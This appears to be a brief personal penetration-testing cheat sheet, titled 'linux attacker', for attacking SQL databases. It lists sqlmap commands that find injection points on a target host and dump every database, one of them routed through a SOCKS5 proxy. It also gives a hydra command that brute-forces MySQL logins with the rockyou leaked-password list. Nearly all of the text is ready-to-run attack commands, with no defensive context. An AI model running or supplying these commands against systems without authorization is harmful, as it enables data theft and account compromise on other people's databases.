# linux attacker

## check and dump information from sql injection

```bash
sqlmap --batch -a --forms -u "http://$rhost" --output-dir="."
sqlmap --batch -a --dump-all --forms -u "http://$rhost" --output-dir="."
```

## sqlmap use specific parameter and proxy

```bash
sqlmap -u http://rhost?id= --proxy socks5://127.0.0.1:1080
```


## bruteforce sql

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $rhost mysql
```
